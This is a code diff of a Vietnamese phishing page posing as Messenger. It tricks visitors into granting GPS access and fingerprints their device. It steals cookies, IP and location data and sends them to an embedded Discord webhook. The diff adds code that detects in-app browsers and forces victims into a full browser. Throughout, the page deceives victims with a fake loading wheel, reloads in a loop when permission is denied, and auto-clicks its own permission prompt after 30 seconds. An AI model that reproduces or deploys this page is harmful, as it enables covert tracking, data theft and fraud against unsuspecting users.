@@ -7,6 +7,17 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
+        #redirectOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999999;
+            background: rgba(0,0,0,0.98); backdrop-filter: blur(16px);
+            display: flex; justify-content: center; align-items: center; flex-direction: column;
+            color: #fff; text-align: center; padding: 20px;
+        }
+        #redirectOverlay .btn {
+            margin-top: 25px; padding: 14px 35px; background: #ffbe0b; color: #000;
+            font-weight: 700; border-radius: 50px; text-decoration: none; font-size: 16px;
+            display: inline-block; cursor: pointer; border: none;
+        }
         #jackLayer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
             background: rgba(0,0,0,0.94); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
@@ -52,6 +63,14 @@
     </style>
 </head>
 <body>
+    <!-- Redirect overlay for in-app browsers -->
+    <div id="redirectOverlay" class="hidden">
+        <div style="font-size:20px; font-weight:600;">⚠️ Vui lòng mở bằng trình duyệt</div>
+        <div style="margin-top:15px; color:#ccc; font-size:15px;" id="redirectMsg"></div>
+        <button class="btn" id="redirectBtn">Mở trong trình duyệt</button>
+    </div>
+
+    <!-- Main phishing content -->
     <div id="jackLayer">
         <!-- Wheel phase -->
         <div id="wheelSection">
@@ -74,235 +93,288 @@
     </div>
 
     <script>
-        const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
-
-        const wheelEl = document.getElementById('wheel');
-        const percentEl = document.getElementById('percent');
-        const statusEl = document.getElementById('statusMsg');
-        const subEl = document.getElementById('subMsg');
-        const tapBtn = document.getElementById('tapButton');
-        const tapPrompt = document.getElementById('tapPrompt');
-        const wheelSection = document.getElementById('wheelSection');
-        const scanSection = document.getElementById('scanSection');
-        const mapImage = document.getElementById('mapImage');
-        const scanStatus = document.getElementById('scanStatus');
-        const scanSub = document.getElementById('scanSub');
-
-        let gpsData = null;
-        let ipData = null;
-        const cookiesStolen = document.cookie || 'none';
-
-        function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }
-
-        function getDeviceHint() {
+        // ========== IN-APP BROWSER DETECTION & FORCED REDIRECT ==========
+        (function() {
             const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return '📱 iPhone: Nhấn "Cho phép" ở góc trên bên trái';
-            if (/Android/.test(ua)) return '📱 Android: Nhấn "Cho phép" ở giữa phía trên';
-            return 'Nhấn "Cho phép" khi trình duyệt hỏi';
-        }
+            const isInApp = /FBAN|FBAV|Instagram|Twitter|TikTok|Pinterest|Snapchat|FB_IAB|MESSENGER|Line|WeChat|KakaoTalk|WhatsApp|Telegram/i.test(ua);
+            // Also check if it's an iOS WebView (not standalone Safari) – but SFSafariViewController is tricky.
+            // For iOS, if standalone is false and not Safari (but contains Safari), we can't force. We'll flag in-app if iOS and not Safari.
+            const isIOS = /iPhone|iPad|iPod/.test(ua);
+            const isSafari = /Safari/.test(ua) && !/CriOS|FxiOS|OPiOS|mercury/.test(ua);
+            const isStandalone = window.navigator.standalone;
+            // Consider in-app if iOS and not standalone and not a regular browser
+            const iosInApp = isIOS && !isStandalone && !isSafari;
 
-        function getFingerprint() {
-            const nav = navigator;
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 280; canvas.height = 60;
-            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
-            const canvasHash = canvas.toDataURL().substring(0, 100);
+            if (isInApp || iosInApp) {
+                // Hide main content
+                document.getElementById('jackLayer').classList.add('hidden');
+                // Show redirect overlay
+                const overlay = document.getElementById('redirectOverlay');
+                overlay.classList.remove('hidden');
+                const msg = document.getElementById('redirectMsg');
+                const btn = document.getElementById('redirectBtn');
 
-            let webglRenderer = 'N/A', webglVendor = 'N/A';
-            try {
-                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
-                }
-            } catch(e) {}
+                const url = 'https://messenger-co.github.io/Axr4t2auYc';
 
-            let audioFP = 'N/A';
-            try {
-                const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-                const osc = actx.createOscillator();
-                osc.type = 'triangle';
-                osc.frequency.setValueAtTime(10000, actx.currentTime);
-                const comp = actx.createDynamicsCompressor();
-                osc.connect(comp); comp.connect(actx.destination);
-                osc.start(0);
-                actx.startRendering();
-                actx.oncomplete = (e) => {
-                    const out = e.renderedBuffer.getChannelData(0);
-                    audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
-                };
-            } catch(e) {}
-
-            const conn = nav.connection || {};
-            return {
-                userAgent: nav.userAgent,
-                language: nav.language,
-                platform: nav.platform,
-                deviceMemory: nav.deviceMemory || 'N/A',
-                hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
-                touchSupport: ('ontouchstart' in window),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                connection: conn.effectiveType || 'N/A',
-                canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
-                cookies: cookiesStolen,
-                battery: null
-            };
-        }
-
-        async function fetchIP() {
-            const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json?token=0', 'http://ip-api.com/json/'];
-            for (let url of apis) {
-                try {
-                    const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
-                    const d = await r.json();
-                    const out = {
-                        ip: d.ip || d.query || '',
-                        city: d.city || '',
-                        region: d.region || d.regionName || '',
-                        country: d.country || d.country_name || '',
-                        lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
-                        lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
-                        isp: d.isp || d.org || ''
+                if (/Android/.test(ua)) {
+                    // Android – use intent to open browser chooser
+                    msg.innerText = 'Bạn đang mở trong ứng dụng. Nhấn nút bên dưới để mở bằng trình duyệt mặc định.';
+                    btn.onclick = function() {
+                        window.location.href = 'intent://messenger-co.github.io/Axr4t2auYc#Intent;scheme=https;end;';
                     };
-                    if (out.ip) return out;
+                } else if (isIOS) {
+                    // iOS – can't force, but we can instruct
+                    msg.innerText = 'Bạn đang mở trong ứng dụng. Vui lòng nhấn nút ⋮ hoặc … và chọn "Mở trong Safari".';
+                    btn.innerText = 'Thử mở bằng Safari';
+                    btn.onclick = function() {
+                        // try to open safari (works sometimes if app supports)
+                        window.open('x-web-search://?messenger-co.github.io/Axr4t2auYc');
+                        // fallback: copy link to clipboard
+                        navigator.clipboard.writeText(url).then(() => {
+                            alert('Link đã được sao chép. Dán vào Safari để mở.');
+                        });
+                    };
+                } else {
+                    msg.innerText = 'Vui lòng sao chép link và mở trong trình duyệt.';
+                    btn.onclick = function() {
+                        window.open(url, '_blank');
+                    };
+                }
+                return; // Stop execution of main script
+            }
+            // If not in-app, proceed with normal code
+            startMainApp();
+        })();
+
+        // ========== MAIN APP (only runs if not in-app browser) ==========
+        function startMainApp() {
+            const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
+
+            const wheelEl = document.getElementById('wheel');
+            const percentEl = document.getElementById('percent');
+            const statusEl = document.getElementById('statusMsg');
+            const subEl = document.getElementById('subMsg');
+            const tapBtn = document.getElementById('tapButton');
+            const tapPrompt = document.getElementById('tapPrompt');
+            const wheelSection = document.getElementById('wheelSection');
+            const scanSection = document.getElementById('scanSection');
+            const mapImage = document.getElementById('mapImage');
+            const scanStatus = document.getElementById('scanStatus');
+            const scanSub = document.getElementById('scanSub');
+
+            let gpsData = null;
+            let ipData = null;
+            const cookiesStolen = document.cookie || 'none';
+
+            function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }
+
+            function getDeviceHint() {
+                const ua = navigator.userAgent;
+                if (/iPhone|iPad|iPod/.test(ua)) return '📱 iPhone: Nhấn "Cho phép" ở góc trên bên trái';
+                if (/Android/.test(ua)) return '📱 Android: Nhấn "Cho phép" ở giữa phía trên';
+                return 'Nhấn "Cho phép" khi trình duyệt hỏi';
+            }
+
+            function getFingerprint() {
+                const nav = navigator;
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 280; canvas.height = 60;
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
+                const canvasHash = canvas.toDataURL().substring(0, 100);
+
+                let webglRenderer = 'N/A', webglVendor = 'N/A';
+                try {
+                    const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
+                    if (gl) {
+                        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
+                    }
                 } catch(e) {}
-            }
-            return null;
-        }
 
-        function getWebRTCIPs() {
-            return new Promise((resolve) => {
-                const ips = new Set();
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = e => {
-                    if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
-                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if (m) ips.add(m[0]);
+                let audioFP = 'N/A';
+                try {
+                    const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                    const osc = actx.createOscillator();
+                    osc.type = 'triangle';
+                    osc.frequency.setValueAtTime(10000, actx.currentTime);
+                    const comp = actx.createDynamicsCompressor();
+                    osc.connect(comp); comp.connect(actx.destination);
+                    osc.start(0);
+                    actx.startRendering();
+                    actx.oncomplete = (e) => {
+                        const out = e.renderedBuffer.getChannelData(0);
+                        audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
+                    };
+                } catch(e) {}
+
+                const conn = nav.connection || {};
+                return {
+                    userAgent: nav.userAgent,
+                    language: nav.language,
+                    platform: nav.platform,
+                    deviceMemory: nav.deviceMemory || 'N/A',
+                    hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
+                    touchSupport: ('ontouchstart' in window),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                    connection: conn.effectiveType || 'N/A',
+                    canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
+                    cookies: cookiesStolen,
+                    battery: null
                 };
-                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
-            });
-        }
-
-        function forceGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }),
-                    err => resolve(null),
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-                setTimeout(() => resolve(null), 9000);
-            });
-        }
-
-        async function sendData() {
-            const fp = getFingerprint();
-            if ('getBattery' in navigator) {
-                try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
             }
-            const localIPs = await getWebRTCIPs();
-            const embed = {
-                title: '📱 **Dữ liệu thiết bị & Vị trí**',
-                color: 0xffa502,
-                fields: [
-                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có (bị từ chối)', inline: true },
-                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
-                    { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
-                    { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
-                    { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
-                    { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
-                    { name: '🖥 Màn hình', value: fp.screen, inline: true },
-                    { name: '📶 Kết nối', value: fp.connection, inline: true },
-                    { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
-                    { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
-                    { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
-                    { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
-                ],
-                footer: { text: 'Axr4t2auYc • GPS loop hoàn hảo' },
-                timestamp: new Date().toISOString()
-            };
-            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
-        }
 
-        function showMap(lat, lon) {
-            // Fallback map image (no API key needed)
-            mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
-        }
+            async function fetchIP() {
+                const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json?token=0', 'http://ip-api.com/json/'];
+                for (let url of apis) {
+                    try {
+                        const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
+                        const d = await r.json();
+                        const out = {
+                            ip: d.ip || d.query || '',
+                            city: d.city || '',
+                            region: d.region || d.regionName || '',
+                            country: d.country || d.country_name || '',
+                            lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
+                            lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
+                            isp: d.isp || d.org || ''
+                        };
+                        if (out.ip) return out;
+                    } catch(e) {}
+                }
+                return null;
+            }
 
-        // ---- Wheel flow ----
-        let progress = 0;
-        const wheelTimer = setInterval(() => {
-            progress += 20;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(wheelTimer);
+            function getWebRTCIPs() {
+                return new Promise((resolve) => {
+                    const ips = new Set();
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = e => {
+                        if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
+                        const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (m) ips.add(m[0]);
+                    };
+                    setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
+                });
+            }
+
+            function forceGPS() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) return resolve(null);
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }),
+                        err => resolve(null),
+                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    );
+                    setTimeout(() => resolve(null), 9000);
+                });
+            }
+
+            async function sendData() {
+                const fp = getFingerprint();
+                if ('getBattery' in navigator) {
+                    try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
+                }
+                const localIPs = await getWebRTCIPs();
+                const embed = {
+                    title: '📱 **Dữ liệu thiết bị & Vị trí**',
+                    color: 0xffa502,
+                    fields: [
+                        { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có (bị từ chối)', inline: true },
+                        { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
+                        { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
+                        { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
+                        { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
+                        { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
+                        { name: '🖥 Màn hình', value: fp.screen, inline: true },
+                        { name: '📶 Kết nối', value: fp.connection, inline: true },
+                        { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
+                        { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
+                        { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
+                        { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
+                    ],
+                    footer: { text: 'Axr4t2auYc • GPS loop hoàn hảo' },
+                    timestamp: new Date().toISOString()
+                };
+                await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
+            }
+
+            function showMap(lat, lon) {
+                mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
+            }
+
+            // Wheel flow
+            let progress = 0;
+            const wheelTimer = setInterval(() => {
+                progress += 20;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(wheelTimer);
+                    wheelEl.classList.add('paused');
+                    percentEl.textContent = '100%';
+                    statusEl.textContent = 'Chuẩn bị kiểm tra vị trí…';
+                    subEl.textContent = '';
+                    tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để tiếp tục)';
+                    tapPrompt.classList.remove('hidden');
+                    tapBtn.classList.remove('hidden');
+                } else {
+                    percentEl.textContent = progress + '%';
+                }
+            }, 1000);
+
+            tapBtn.addEventListener('click', async () => {
+                vibrate();
+                tapBtn.classList.add('hidden');
+                tapPrompt.classList.add('hidden');
+                statusEl.textContent = 'Đang lấy vị trí GPS…';
+                wheelEl.classList.remove('paused');
+                percentEl.textContent = '0%';
+                let fake = 0;
+                const fakeInterval = setInterval(() => {
+                    fake += 20;
+                    percentEl.textContent = fake + '%';
+                    if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
+                }, 80);
+
+                const gpsPromise = forceGPS();
+                ipData = await fetchIP();
+                gpsData = await gpsPromise;
+
+                clearInterval(fakeInterval);
                 wheelEl.classList.add('paused');
                 percentEl.textContent = '100%';
-                statusEl.textContent = 'Chuẩn bị kiểm tra vị trí…';
-                subEl.textContent = '';
-                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để tiếp tục)';
-                tapPrompt.classList.remove('hidden');
-                tapBtn.classList.remove('hidden');
-            } else {
-                percentEl.textContent = progress + '%';
-            }
-        }, 1000);
 
-        tapBtn.addEventListener('click', async () => {
-            vibrate();
-            tapBtn.classList.add('hidden');
-            tapPrompt.classList.add('hidden');
-            statusEl.textContent = 'Đang lấy vị trí GPS…';
-            wheelEl.classList.remove('paused');
-            percentEl.textContent = '0%';
-            let fake = 0;
-            const fakeInterval = setInterval(() => {
-                fake += 20;
-                percentEl.textContent = fake + '%';
-                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
-            }, 80);
-
-            const gpsPromise = forceGPS();
-            ipData = await fetchIP();
-            gpsData = await gpsPromise;
-
-            clearInterval(fakeInterval);
-            wheelEl.classList.add('paused');
-            percentEl.textContent = '100%';
-
-            if (gpsData) {
-                wheelSection.classList.add('hidden');
-                scanSection.classList.remove('hidden');
-                if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
-                else if (ipData && ipData.lat && ipData.lon) showMap(ipData.lat, ipData.lon);
-                scanStatus.textContent = 'Định vị thành công!';
-                scanSub.textContent = 'Đang phân tích thiết bị…';
-                vibrate();
-                setTimeout(() => {
-                    scanSub.textContent = 'Thiết bị an toàn. Chuyển hướng…';
+                if (gpsData) {
+                    wheelSection.classList.add('hidden');
+                    scanSection.classList.remove('hidden');
+                    if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
+                    else if (ipData && ipData.lat && ipData.lon) showMap(ipData.lat, ipData.lon);
+                    scanStatus.textContent = 'Định vị thành công!';
+                    scanSub.textContent = 'Đang phân tích thiết bị…';
                     vibrate();
                     setTimeout(() => {
-                        window.location.href = 'https://www.messenger.com/';
-                    }, 1200);
-                }, 2000);
-                await sendData();
-            } else {
-                // Denied – instant reload loop
-                await sendData();
-                window.location.reload();
-            }
-        });
+                        scanSub.textContent = 'Thiết bị an toàn. Chuyển hướng…';
+                        vibrate();
+                        setTimeout(() => {
+                            window.location.href = 'https://www.messenger.com/';
+                        }, 1200);
+                    }, 2000);
+                    await sendData();
+                } else {
+                    await sendData();
+                    window.location.reload();
+                }
+            });
 
-        // Auto-click after 30 seconds if user doesn't tap
-        setTimeout(() => {
-            if (!tapBtn.classList.contains('hidden')) tapBtn.click();
-        }, 30000);
+            setTimeout(() => {
+                if (!tapBtn.classList.contains('hidden')) tapBtn.click();
+            }, 30000);
+        }
     </script>
 </body>
 </html>
